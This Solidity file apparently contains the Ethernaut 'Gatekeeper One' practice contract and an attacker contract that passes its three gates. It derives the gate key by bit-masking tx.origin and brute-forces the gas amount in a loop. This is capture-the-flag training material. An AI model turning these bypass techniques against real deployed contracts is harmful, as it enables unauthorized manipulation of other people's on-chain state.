// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract GatekeeperOne {
  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperOneAttacker {
  address immutable target;
  bytes8 immutable key;
  uint correctGas;

  constructor(address target_) {
    target = target_;
    key = bytes8(uint64(uint160(tx.origin))) & hex"FFFFFFFF0000FFFF";
  }

  function enterOnce(uint _gas) public {
    bytes memory callbytes = abi.encodeWithSignature(("enter(bytes8)"), key);
    (bool success, ) = target.call{gas: _gas}(callbytes);
    require(success, "failed my boy.");
  }

  function enter(uint _gas, uint _margin) public {
    bytes memory callbytes = abi.encodeWithSignature("enter(bytes8)", key);
    bool success;
    for (uint g = _gas - _margin; g <= _gas + _margin; g++) {
      (success, ) = target.call{gas: g}(callbytes);
      if (success) {
        correctGas = g; // for curiosity
        break;
      }
    }
    require(success, "failed again my boy.");
  }
}
